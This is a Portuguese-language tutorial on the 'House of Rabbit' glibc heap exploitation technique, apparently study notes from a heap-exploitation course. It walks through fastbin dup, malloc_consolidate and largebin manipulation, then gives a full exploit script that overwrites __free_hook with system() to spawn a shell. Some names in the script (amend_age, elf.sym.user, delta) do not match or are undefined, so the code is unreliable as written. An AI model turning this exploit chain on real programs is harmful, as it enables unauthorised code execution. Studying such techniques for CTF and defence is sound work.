# House Of Rabbit

- [House Of Rabbit](#house-of-rabbit)
- [Teoria](#teoria)
- [Ataque](#ataque)
  - [Fastbin dup](#fastbin-dup)
  - [malloc_consolidate()](#malloc_consolidate)
  - [largebin](#largebin)
    - [Aumentar system_mem](#aumentar-system_mem)
  - [Write](#write)
  - [Exec](#exec)
- [Alternativas para linkar o chunk_fake no largebins](#alternativas-para-linkar-o-chunk_fake-no-largebins)
- [Fontes e creditos](#fontes-e-creditos)

# Teoria
A House of Rabbit busca nos dar um primitivo similar a House of 
Force e a tecnica nao usa um heap leak. Ela é chamada assim, pois 
o chunk fica pulando entre múltiplos bins como um coelhinho.

Fast bin dup ->

O nosso objetivo com essa tecnica é dar um arbwrite em um endereço acima do 
chunk falso.

Nos iremos fazer isso por meio de um fake chunk de tamanho enorme, que da um 
wrap around no va-space... Assim, o nosso write é relativo, nao precisando de  
um heap leak, somente o endereço do chunk falso e o offset para o alvo!

Porem como o fake e enorme, nos somente podemos aloca-lo a partir do unsorted 
ou do largebin apropriado.

Alem disso, o unsorted bin tem checks no size em relação a memoria max, assim 
so sobrando o large bins para linkarmos o chunk falso! Visto que eles nao 
possuem checks no size (o ultimo largebin `>= 0x80000` (ate infinito))!

Então, se alocarmos o nosso chunk falso no maior largebin (bin 126), podemos 
forjar o size dele para fazermos mallocs de qualquer tamanho :D

# Ataque
Para poder mover o fake chunk de um bin para o outro, vamos precisar alterar 
seus meta-dados múltiplas vezes....

Para isso, vamos assumir que o `elf.sym.username` é armazenado no `.data` 
proximo ao `alvo` (aonde queremos escrever), e nos podemos altera-lo quando 
quisermos pela função `username()`! 

- Fast bin dup -> fake:fast 
- malloc_consolidate() -> fake:unsorted
- SORT -> fake:large 
- tamanho enorme -> free ->  
  
## Fastbin dup
Nos vamos começar o ataque com um fastbin dup (de qualquer tamanho)
```py
### FASTBIN ###
chunk_fake = elf.sym.username 
username(p64(0x21))

chunk_A = malloc(0x18)
chunk_B = malloc(0x18)

free(chunk_A)
free(chunk_B)
free(chunk_A)

chunk_A = malloc(0x18)
edit(chunk_A, p64(chunk_fake - 8) )
```

Assim, o chunk falso agora esta linkado no fastbin

```py
0x0000000000000000	0x0000000000000021 <-- fastbins[0x20][1]
    chunk_fake-8 	0x0000000000000000	
0x0000000000000000	0x0000000000000021 <-- fastbins[0x20][0]
0x0000000000000000	0x0000000000000000	
0x0000000000000000	0x0000000000020fc1 <-- Top chunk
 
fastbin 0x20: chunk_B —▸ chunk_A —▸ chunk_fake (username) ◂— 0x0
                 
```

## malloc_consolidate()
`malloc_consolidate()` pega todos os fast chunks de uma arena e os coloca no 
unsorted bin, assim, transferindo o nosso fake

Nos poderíamos usar o método do malloc, mas o nosso chunk nao passa: 
`fencepost < chunk <= system_mem` do search nos unsorted bins que viria em 
seguida (workarounds la no teoria)

Assim, vamos precisar usar o método do free1

Durante o malloc_consolidate, o programa vai tentar consolidar o nosso 
chunk_fake para frente

Voce pode colocar fenceposts ou simplesmente alterar o size para `0x1` 
```py
### FASTBIN ###
...

### UNSORTED ###
username(1)
chunk_C = malloc(0x88)
free(chunk_C) # Consolidar chunk_C com o top chamou malloc_consolidate()
              # sem alocar dos unsortedbins
```

```py
HEAP
0x0000000000000000	0x0000000000021001	 <-- Top chunk

chunk_fake
0x0000000000000000	0x0000000000000001
0x00007f1ed5d27b58	0x00007f1ed5d27b58
0x0000000000000000	0x0000000000000000
0x0000000000000000	0x0000000000000000

pwndbg> unsortedbin 
all: chunk_fake —▸ 0x7f1ed5d27b58 (main_arena+88) ◂— chunk_fake
```
## largebin
Agora, basta alterar o size do chunk_fake e **SORT** ele para o maior large bin
```py
### FASTBIN ###
...

### UNSORTED ###
...

### LARGEBIN ###
username(0x80001)
malloc(0x80008) # Algo maior, para o nosso chunk ser SORT e nao alocado 
```

Agora, o chunk_fake esta legitimamente no maior large bin (mantendo a 
estabilidade da arena), e podendo ter tamanho infinito

### Aumentar system_mem
Caso nesse ponto o seu system_mem seja menor que 0x80000 o chunk nao passara o check de tamanho dos unsortedbins: <= system_mem

voce precisa no inicio do seu exploit (antes do fastbin dup) pegar um chunk 
grande (chunk_X) para aumentar system_mem 

Porem, caso o chunk_X seja maior que mmap_threshold (voce pode 
checar com `p mp_`) o chunk nao ira pro heap e nao mudara system_mem

Caso voce queira aumentar a sua mmap_threshold basta dar free() nele,
e em seguida aloca-lo de novo aumentando o system_mem

```py
### SYSTEM_MEM ###
chunk_X = malloc(0x60000) # MMAP
free(chunk_X)             # Elevar threshold
chunk_X = malloc(0x60000) # Elevar system_mem

### FASTBIN ###
...
### UNSORTED ###
...
### LARGEBIN ###
...
```
## Write


A partir desse momento, temos uma House of Force, inclusive utilizando a mesma 
formula:
```py
def wrap(A,B):
    return (0xffffffffffffffff - A)+B
```

Basta criar um chunk enorme que da uma volta no va-space

Em seguida, poderemos dividir esse chunk e alocar a partir dele, e 
diferentemente do top chunk, nao temos mitigações

```py
### WRITE ###
username(0xfffffffffffffff1) # maior tamanho possível de chunk
malloc(delta(fake_chunk, alvo-0x20))
chunk_alvo = malloc(0x20)
```
## Exec
Voce pode usar o write, assim como na house of force, para corromper os hooks

por exemplo, o __free_hook com system() e chamar free() num chunk com /bin/sh

eu vou reutilizar o do LARGEBINS

Como o remainder nao vai consumir tanto, nos nao precisamos do maior tamanho 
de chunk 

Assim, o nosso exploit inteiro fica:
```py
def wrap(A,B):
    return (0xffffffffffffffff - A)+B

### SYSTEM_MEM ###
chunk_X = malloc(0x60000) # MMAP
free(chunk_X)             # Elevar threshold
chunk_X = malloc(0x60000) # Elevar system_mem

### FASTBIN ###
chunk_fake = elf.sym.username 
username(p64(0x21))

chunk_A = malloc(0x18)
chunk_B = malloc(0x18)

free(chunk_A)
free(chunk_B)
free(chunk_A)

chunk_A = malloc(0x18)
edit(chunk_A, p64(chunk_fake - 8) )

### UNSORTED ###
username(1)
chunk_C = malloc(0x88)
free(chunk_C) # Consolidar chunk_C com o top chamou malloc_consolidate()
              # sem alocar dos unsortedbins

### LARGEBIN ###
amend_age(0x80001)
chunk_SH = malloc(0x80008) # Algo maior, para o nosso chunk ser SORT e nao alocado
edit(chunk_SH, "/bin/sh\x00")

### WRITE ###
distancia = libc.sym.__free_hook-0x20 - elf.sym.user

username(distancia + 0x29)

malloc(distancia)
malloc(0x18, flat(0, libc.sym.system)) # free_hook nao e alinhado 16bytes
free(chunk_SH)
```

# Alternativas para linkar o chunk_fake no largebins

Voce poderia dar um double free no large chunk (ou UAF) e modificar os 
meta-dados apontando para o chunk falso estilo fastbin dup, porem voce 
precisaria alterar o prev_size do chunk seguinte (mitigação dos chunks normais)

Alem disso, poderíamos usar a House Of Lore para isso, porem corromperíamos o 
unsorted bin, tornando o resto do exploit difícil!

# Fontes e creditos
- [Udemy: Max Kamper](https://www.udemy.com/course/linux-heap-exploitation-part-2)